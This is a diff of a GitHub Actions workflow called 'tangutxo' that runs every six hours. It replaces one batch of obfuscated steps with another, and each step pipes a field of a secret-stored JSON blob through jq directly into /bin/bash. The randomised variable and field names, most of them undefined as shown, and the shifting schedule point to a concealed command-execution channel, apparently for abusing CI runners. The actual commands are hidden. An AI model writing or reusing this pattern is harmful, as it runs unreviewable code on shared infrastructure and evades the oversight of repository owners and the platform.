@@ -3,9 +3,9 @@ name: tangutxo
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 4/6 * * *'
+    - cron: '35 3/6 * * *'
 
-jobs:  # 1219
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,13 +13,17 @@ jobs:  # 1219
       - uses: actions/checkout@v4
       - name: tangutxo
         env:
-          gwp95: ${{ secrets.gwp95 }}
+          t22: ${{ secrets.t22 }}
         run: |
-          echo $gwp95 | jq -r .yd45 | /bin/bash
-          echo $ngiux226 | jq -r .vvbhg35430 | /bin/bash
-          echo $omuv4 | jq -r .pd47 | /bin/bash
-          echo $pvmjw7931 | jq -r .oa4205 | /bin/bash
-          echo $ews417 | jq -r .my0574 | /bin/bash
-          echo $foo6 | jq -r .xdpu8058 | /bin/bash
-          echo $o55 | jq -r .h29 | /bin/bash
+          echo $t22 | jq -r .vdjf918 | /bin/bash
+          echo $ik08707 | jq -r .lf30 | /bin/bash
+          echo $kw51627 | jq -r .wdif27364 | /bin/bash
+          echo $be683 | jq -r .oysh5 | /bin/bash
+          echo $zgn72436 | jq -r .vrl46 | /bin/bash
+          echo $ioula11101 | jq -r .zams73405 | /bin/bash
+          echo $l1 | jq -r .ydom4792 | /bin/bash
+          echo $bc24501 | jq -r .bjqfs8182 | /bin/bash
+          echo $xr9 | jq -r .qt61334 | /bin/bash
+          echo $ogo1175 | jq -r .ecday4 | /bin/bash
+          echo $bqoem0097 | jq -r .yf40 | /bin/bash
 
